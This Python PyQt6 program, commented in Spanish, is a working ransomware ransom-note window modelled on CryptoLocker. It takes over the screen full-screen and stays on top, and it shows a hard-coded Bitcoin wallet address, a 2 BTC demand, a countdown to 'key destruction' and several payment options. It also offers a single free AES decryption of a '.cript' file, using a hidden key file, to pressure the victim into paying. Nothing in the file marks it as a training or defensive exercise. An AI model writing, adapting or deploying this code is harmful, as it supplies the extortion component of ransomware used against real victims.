import sys
import os
import argparse
import subprocess
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QPushButton, QLabel, QLineEdit, 
                             QComboBox, QTextEdit, QFrame, QListView, QFileDialog,
                             QMessageBox)
from PyQt6.QtCore import Qt, QTimer, QByteArray
from PyQt6.QtGui import QFont, QColor, QPalette, QLinearGradient, QBrush, QPainter, QPixmap
from PyQt6.QtSvgWidgets import QSvgWidget

# Configuración por argumentos de línea de comandos
def parse_args():
    parser = argparse.ArgumentParser(description='Ventana de aviso CryptoLocker')
    parser.add_argument('--wallet', type=str, default='1KP72fBmh3XBRfuJDMn53APaqM6iMRspCh', 
                        help='Dirección de wallet Bitcoin')
    parser.add_argument('--amount', type=str, default='2', 
                        help='Cantidad de BTC a pagar')
    parser.add_argument('--hours', type=int, default=71, 
                        help='Horas del temporizador')
    parser.add_argument('--minutes', type=int, default=57, 
                        help='Minutos del temporizador')
    parser.add_argument('--seconds', type=int, default=22, 
                        help='Segundos del temporizador')
    parser.add_argument('--files', type=int, default=0, 
                        help='Número de archivos cifrados')
    parser.add_argument('--title', type=str, default='CryptoLocker', 
                        help='Título de la ventana')
    return parser.parse_args()

# Configuración global (se setea desde main)
CONFIG = {
    'wallet': '1KP72fBmh3XBRfuJDMn53APaqM6iMRspCh',
    'amount': '2',
    'hours': 50,
    'minutes': 57,
    'seconds': 22,
    'files': 0,
    'title': 'CryptoLocker'
}

# Datos SVG del escudo (incrustados para no necesitar archivos externos)
SVG_SHIELD = """
<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <path d="M50 5 L90 20 V50 C90 75 50 95 50 95 C50 95 10 75 10 50 V20 Z" fill="#2563EB" stroke="#1E3A8A" stroke-width="2"/>
    <path d="M50 5 V95 C50 95 10 75 10 50 V20 Z" fill="#3B82F6" fill-opacity="0.5"/>
    <path d="M15 25 L45 25 L45 55 L15 55 Z" fill="white" />
    <path d="M55 60 L85 60 L85 80 L55 80 Z" fill="white" />
</svg>
"""

# Imagen de flecha hacia abajo en Base64 (PNG pequeño) para el ComboBox
ARROW_ICON_B64 = "url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3wUWEwkq4y+u7QAAAFVJREFUGFddzzEOwDAIA0G79P9/cZq4g6lCS6R2CgQ2x0w9E0L8kYvI3p0111zM7C4iEwA9E9HdevfW2t0fAACA3d0RwczsHBEAAHrn6q2190wEAAAAwB9dOwy4w4t+awAAAABJRU5ErkJggg==)"

class VentanaCryptoLocker(QMainWindow):
    def __init__(self):
        super().__init__()
        # Usar configuración global
        self.total_seconds = (CONFIG['hours'] * 3600) + (CONFIG['minutes'] * 60) + CONFIG['seconds']
        self.files_encrypted = CONFIG['files']
        self.wallet = CONFIG['wallet']
        self.amount = CONFIG['amount']
        self.inicializar_ui()
        self.iniciar_temporizador()
    
    def inicializar_ui(self):
        self.setWindowTitle(CONFIG['title'])
        
        # Hacer la ventana siempre visible en primer plano y PANTALLA COMPLETA
        self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint | Qt.WindowType.FramelessWindowHint)
        self.showFullScreen()
        
        # Estilos Globales (QSS)
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: #8B0000;
            }}
            QLabel {{
                color: white;
                font-family: Arial;
            }}
            /* Fix para texto invisible en QMessageBox - forzando negro */
            QMessageBox {{
                background-color: #f0f0f0;
            }}
            QMessageBox QLabel {{
                color: black; 
                background-color: transparent;
            }}
            QPushButton {{
                color: white;
                font-size: 14px;
                font-weight: bold;
                border: 1px solid #003366;
                border-radius: 4px;
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                      stop:0 #4a90e2, stop:1 #003366);
                padding: 6px 12px;
                min-width: 80px;
            }}
            QPushButton:hover {{
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                      stop:0 #5aa0f2, stop:1 #004488);
                border: 1px solid #004488;
            }}
            QPushButton:pressed {{
                background-color: #002244;
            }}
            /* Inputs estilo blanco limpio */
            QLineEdit, QComboBox, QTextEdit {{
                background-color: white;
                border: 1px solid #AAAAAA;
                border-radius: 2px;
                padding: 4px;
                font-size: 12px;
                color: black;
            }}
            
            /* ESTILOS DEL COMBOBOX */
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: top right;
                width: 20px;
                border-left-width: 1px;
                border-left-color: #AAAAAA;
                border-left-style: solid;
                border-top-right-radius: 3px;
                border-bottom-right-radius: 3px;
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #fefefe, stop:1 #e0e0e0);
            }}
            
            QComboBox::down-arrow {{
                image: {ARROW_ICON_B64};
                width: 10px;
                height: 10px;
            }}
            
            QComboBox QAbstractItemView {{
                border: 1px solid #AAAAAA;
                background-color: white;
                color: black;
                selection-background-color: #298CE1;
                selection-color: white;
            }}
        """)
        
        # Widget Central
        widget_central = QWidget()
        self.setCentralWidget(widget_central)
        
        # Layout Principal
        layout_principal = QVBoxLayout()
        layout_principal.setContentsMargins(50, 50, 50, 50)
        widget_central.setLayout(layout_principal)
        
        # --- HEADER ---
        titulo = QLabel("Pago por clave privada")
        titulo.setAlignment(Qt.AlignmentFlag.AlignCenter)
        titulo.setFont(QFont("Arial", 28, QFont.Weight.Bold))
        titulo.setStyleSheet("color: white; margin-bottom: 20px;")
        layout_principal.addWidget(titulo)
        
        # --- CONTENIDO (Dividido en Izquierda y Derecha) ---
        layout_contenido = QHBoxLayout()
        layout_contenido.setSpacing(40)
        
        # 1. PANEL IZQUIERDO (Escudo y Timer)
        panel_izquierdo = QWidget()
        panel_izquierdo.setFixedWidth(350)
        layout_izq = QVBoxLayout()
        panel_izquierdo.setLayout(layout_izq)
        
        # Escudo
        contenedor_escudo = QWidget()
        layout_escudo = QVBoxLayout(contenedor_escudo)
        
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        escudo_path = os.path.join(script_dir, 'escudo.png')
        
        if os.path.exists(escudo_path):
            shield_label = QLabel()
            pixmap = QPixmap(escudo_path)
            shield_label.setPixmap(pixmap.scaled(250, 250, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
            shield_label.setFixedSize(250, 250)
            shield_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            layout_escudo.addWidget(shield_label, alignment=Qt.AlignmentFlag.AlignCenter)
        else:
            shield_widget = QSvgWidget()
            shield_widget.load(QByteArray(SVG_SHIELD.encode('utf-8')))
            shield_widget.setFixedSize(250, 250)
            layout_escudo.addWidget(shield_widget, alignment=Qt.AlignmentFlag.AlignCenter)
        
        layout_izq.addWidget(contenedor_escudo)
        
        layout_izq.addSpacing(30)
        
        # Texto de destrucción
        lbl_destruccion = QLabel("Su clave privada será destruida el")
        lbl_destruccion.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl_destruccion.setFont(QFont("Arial", 14))
        layout_izq.addWidget(lbl_destruccion)
        
        lbl_fecha = QLabel("9/20/2026\n6:48 PM")
        lbl_fecha.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl_fecha.setFont(QFont("Arial", 16, QFont.Weight.Bold))
        layout_izq.addWidget(lbl_fecha)
        
        layout_izq.addSpacing(40)
        
        # Timer Display
        lbl_time_left = QLabel("Tiempo restante")
        lbl_time_left.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl_time_left.setFont(QFont("Arial", 16))
        layout_izq.addWidget(lbl_time_left)
        
        # Fondo oscuro para el timer
        frame_timer = QFrame()
        frame_timer.setStyleSheet("background-color: rgba(0, 0, 0, 50); border-radius: 8px;")
        layout_frame_timer = QVBoxLayout(frame_timer)
        
        self.label_contador = QLabel()
        self.label_contador.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label_contador.setFont(QFont("Arial", 36, QFont.Weight.Bold))
        self.label_contador.setStyleSheet("color: #FFD700; background-color: transparent;")
        self.actualizar_texto_timer()
        
        layout_frame_timer.addWidget(self.label_contador)
        layout_izq.addWidget(frame_timer)
        
        layout_izq.addStretch()
        
        # 2. PANEL DERECHO
        panel_derecho = QWidget()
        panel_derecho.setStyleSheet("""
            QWidget {
                background-color: white;
                border-radius: 6px;
            }
            QLabel {
                color: #333333;
                background-color: transparent;
            }
        """)
        layout_der = QVBoxLayout()
        layout_der.setContentsMargins(30, 30, 30, 30)
        panel_derecho.setLayout(layout_der)
        
        # Dropdown Metodo de pago
        lbl_metodo = QLabel("Elija un método de pago conveniente:")
        lbl_metodo.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        layout_der.addWidget(lbl_metodo)
        
        combo_pago = QComboBox()
        combo_pago.setView(QListView())
        combo_pago.addItems(["Bitcoin (opción más barata)", "MoneyPak", "Ukash", "Paysafecard", "cashU"])
        combo_pago.setFixedHeight(35)
        layout_der.addWidget(combo_pago)
        
        layout_der.addSpacing(20)
        
        # Logo Bitcoin
        layout_btc_logo = QHBoxLayout()
        layout_btc_logo.addStretch()
        
        lbl_btc_icon = QLabel("₿")
        lbl_btc_icon.setStyleSheet("color: white; background-color: #F7931A; border-radius: 25px; padding: 0px 12px;")
        lbl_btc_icon.setFont(QFont("Arial", 28, QFont.Weight.Bold))
        lbl_btc_icon.setFixedSize(50, 50)
        lbl_btc_icon.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        lbl_btc_text = QLabel("bitcoin")
        font_btc = QFont("Arial", 36)
        font_btc.setWeight(QFont.Weight.Bold)
        font_btc.setItalic(True)
        lbl_btc_text.setFont(font_btc)
        lbl_btc_text.setStyleSheet("color: #444;")
        
        layout_btc_logo.addWidget(lbl_btc_icon)
        layout_btc_logo.addWidget(lbl_btc_text)
        layout_btc_logo.addStretch()
        layout_der.addLayout(layout_btc_logo)
        
        # Descripción
        desc_text = (
            "Bitcoin es una criptomoneda donde la creación y transferencia de bitcoins se basa en un "
            "protocolo criptográfico de código abierto que es independiente de cualquier autoridad central. "
            "Los Bitcoins se pueden transferir a través de una computadora o teléfono inteligente sin una institución "
            "financiera intermediaria."
        )
        lbl_desc = QLabel(desc_text)
        lbl_desc.setWordWrap(True)
        lbl_desc.setStyleSheet("font-size: 14px; margin-bottom: 15px;")
        layout_der.addWidget(lbl_desc)
        
        # Instrucciones de pago
        instrucciones_container = QWidget()
        layout_inst = QVBoxLayout(instrucciones_container)
        layout_inst.setContentsMargins(0,0,0,0)
        
        lbl_inst1 = QLabel("Debe enviar la cantidad especificada a continuación a la dirección Bitcoin:")
        lbl_inst1.setStyleSheet("font-size: 13px; font-weight: bold;")
        
        wallet_box = QLabel("1KP72fBmh3XBRfuJDMn53APaqM6iMRspCh")
        wallet_box.setStyleSheet("""
            background-color: #F0F0F0; 
            border: 1px dashed #666; 
            padding: 8px; 
            font-weight: bold; 
            font-family: Courier New;
            font-size: 14px;
            color: black;
        """)
        wallet_box.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        
        lbl_inst2 = QLabel("y especificar el ID de transacción, que será verificado y confirmado.")
        lbl_inst2.setStyleSheet("font-size: 13px; font-weight: bold;")
        
        layout_inst.addWidget(lbl_inst1)
        layout_inst.addWidget(wallet_box)
        layout_inst.addWidget(lbl_inst2)
        layout_der.addWidget(instrucciones_container)
        
        layout_der.addSpacing(20)
        
        # Links
        lbl_link1 = QLabel('<a href="#" style="color: #00AA00; text-decoration: underline;">Página de Inicio</a>')
        lbl_link1.setOpenExternalLinks(False)
        lbl_link1.setFont(QFont("Arial", 12))
        lbl_link2 = QLabel('<a href="#" style="color: #00AA00; text-decoration: underline;">Comenzando con Bitcoin</a>')
        lbl_link2.setFont(QFont("Arial", 12))
        
        layout_der.addWidget(lbl_link1)
        layout_der.addWidget(lbl_link2)
        
        layout_der.addStretch()
        
        # Input Transacción
        lbl_trans = QLabel("Ingrese ID de transacción y presione «Pagar»:")
        lbl_trans.setStyleSheet("font-weight: bold; font-size: 13px;")
        layout_der.addWidget(lbl_trans)
        
        layout_input_row = QHBoxLayout()
        input_trans = QLineEdit()
        input_trans.setFixedHeight(35)
        
        combo_btc_amount = QComboBox()
        combo_btc_amount.setView(QListView())
        combo_btc_amount.addItems(["2      BTC"])
        combo_btc_amount.setFixedWidth(120)
        combo_btc_amount.setFixedHeight(35)
        
        layout_input_row.addWidget(input_trans)
        layout_input_row.addWidget(combo_btc_amount)
        layout_der.addLayout(layout_input_row)
        
        layout_contenido.addWidget(panel_izquierdo)
        layout_contenido.addWidget(panel_derecho)
        layout_principal.addLayout(layout_contenido)
        
        layout_principal.addStretch()
        
        # --- SECCIÓN DESCIFRAR UN ARCHIVO (Prueba de pago) ---
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        used_flag = os.path.join(script_dir, '.decrypt_used')
        
        self.contenedor_decrypt = QWidget()
        # Verificar estado inicial
        if os.path.exists(used_flag):
            self.contenedor_decrypt.setVisible(False)
        else:
            self.contenedor_decrypt.setVisible(True)
        
        layout_decrypt = QHBoxLayout(self.contenedor_decrypt)
        layout_decrypt.setContentsMargins(20, 10, 20, 0)
        
        lbl_decrypt = QLabel("Descifrar UN archivo GRATIS (prueba):")
        lbl_decrypt.setStyleSheet("color: #FFD700; font-weight: bold; font-size: 16px;")
        layout_decrypt.addWidget(lbl_decrypt)
        
        self.txt_decrypt_file = QLineEdit()
        self.txt_decrypt_file.setPlaceholderText("Seleccione un archivo .cript...")
        self.txt_decrypt_file.setFixedHeight(35)
        self.txt_decrypt_file.setStyleSheet("background: white; color: black; padding: 5px; font-size: 14px;")
        layout_decrypt.addWidget(self.txt_decrypt_file)
        
        btn_browse = QPushButton("Explorar")
        btn_browse.setFixedWidth(120)
        btn_browse.setFixedHeight(35)
        btn_browse.clicked.connect(self.browse_file)
        layout_decrypt.addWidget(btn_browse)
        
        btn_decrypt_one = QPushButton("Descifrar")
        btn_decrypt_one.setFixedWidth(120) 
        btn_decrypt_one.setFixedHeight(35)
        btn_decrypt_one.setStyleSheet("""
            QPushButton {
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #00e676, stop:1 #00a152);
                border: 1px solid #008040;
                color: #004d26;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #33ff99, stop:1 #00b359);
            }
        """)
        btn_decrypt_one.clicked.connect(self.decrypt_one_file)
        layout_decrypt.addWidget(btn_decrypt_one)
        
        layout_principal.addWidget(self.contenedor_decrypt)
        
        # --- FOOTER (Botones) ---
        layout_botones = QHBoxLayout()
        layout_botones.setContentsMargins(0, 20, 0, 0)
        
        btn_back = QPushButton("<< Volver")
        btn_back.setFixedSize(200, 50)
        btn_back.clicked.connect(self.close)
        
        btn_pay = QPushButton("PAGAR")
        btn_pay.setFixedSize(200, 50)
        
        layout_botones.addStretch()
        layout_botones.addWidget(btn_back)
        layout_botones.addSpacing(30)
        layout_botones.addWidget(btn_pay)
        layout_botones.addStretch()
        
        layout_principal.addLayout(layout_botones)
    
    def iniciar_temporizador(self):
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.actualizar_tiempo)
        self.timer.start(1000)
    
    def actualizar_tiempo(self):
        if self.total_seconds > 0:
            self.total_seconds -= 1
            self.actualizar_texto_timer()
        else:
            self.timer.stop()
            
    def actualizar_texto_timer(self):
        hours = self.total_seconds // 3600
        minutes = (self.total_seconds % 3600) // 60
        seconds = self.total_seconds % 60
        self.label_contador.setText(f"{hours:02d} : {minutes:02d} : {seconds:02d}")
    
    def browse_file(self):
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        used_flag = os.path.join(script_dir, '.decrypt_used')
        
        if os.path.exists(used_flag):
            if hasattr(self, 'contenedor_decrypt'):
                self.contenedor_decrypt.setVisible(False)
            QMessageBox.warning(self, "Límite Alcanzado", 
                "Ya has utilizado tu descifrado GRATUITO.\n\n"
                "Para descifrar más archivos, debes PAGAR el rescate.")
            return
        
        file_path, _ = QFileDialog.getOpenFileName(
            self, 
            "Seleccionar archivo cifrado", 
            "", 
            "Archivos Cifrados (*.cript);;Todos los archivos (*.*)"
        )
        if file_path:
            self.txt_decrypt_file.setText(file_path)
    
    def decrypt_one_file(self):
        script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        used_flag = os.path.join(script_dir, '.decrypt_used')
        
        if os.path.exists(used_flag):
            if hasattr(self, 'contenedor_decrypt'):
                self.contenedor_decrypt.setVisible(False)
            QMessageBox.warning(self, "Límite Alcanzado", 
                "Ya has utilizado tu descifrado GRATUITO.\n\n"
                "Para descifrar más archivos, debes PAGAR el rescate.")
            return
        
        file_path = self.txt_decrypt_file.text().strip()
        if not file_path:
            QMessageBox.warning(self, "Error", "Por favor seleccione un archivo primero.")
            return
        
        if not os.path.exists(file_path):
            QMessageBox.warning(self, "Error", f"Archivo no encontrado: {file_path}")
            return
        
        # Descifrar el archivo usando AES
        try:
            import hashlib
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            # Leer clave desde archivo de configuración
            key_file = os.path.join(os.path.dirname(sys.argv[0]), '.aes_key')
            if os.path.exists(key_file):
                with open(key_file, 'r') as f:
                    key_hex = f.read().strip()
                    key = bytes.fromhex(key_hex)
            else:
                QMessageBox.warning(self, "Error", "Clave de descifrado no encontrada. Contacte al administrador.")
                return
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            encrypted_data = data[16:]
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
            
            pad_len = decrypted[-1]
            decrypted = decrypted[:-pad_len]
            
            original_path = file_path[:-6]
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(file_path)
            
            # Marcar que ya se usó
            with open(used_flag, 'w') as f:
                f.write(f"Usado en: {file_path}\n")
            
            QMessageBox.information(self, "Éxito", 
                f"¡Archivo descifrado exitosamente!\n\n"
                f"Restaurado: {original_path}\n\n"
                f"⚠️ Este fue tu ÚNICO descifrado GRATIS.\n"
                f"Para descifrar más archivos, debes PAGAR.")
            
            # Ocultar la sección inmediatamente
            if hasattr(self, 'contenedor_decrypt'):
                self.contenedor_decrypt.setVisible(False)
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Fallo al descifrar: {str(e)}")

if __name__ == '__main__':
    # Parsear argumentos de línea de comandos
    args = parse_args()
    
    # Actualizar configuración global
    CONFIG['wallet'] = args.wallet
    CONFIG['amount'] = args.amount
    CONFIG['hours'] = args.hours
    CONFIG['minutes'] = args.minutes
    CONFIG['seconds'] = args.seconds
    CONFIG['files'] = args.files
    CONFIG['title'] = args.title
    
    app = QApplication(sys.argv)
    ventana = VentanaCryptoLocker()
    ventana.show()
    sys.exit(app.exec())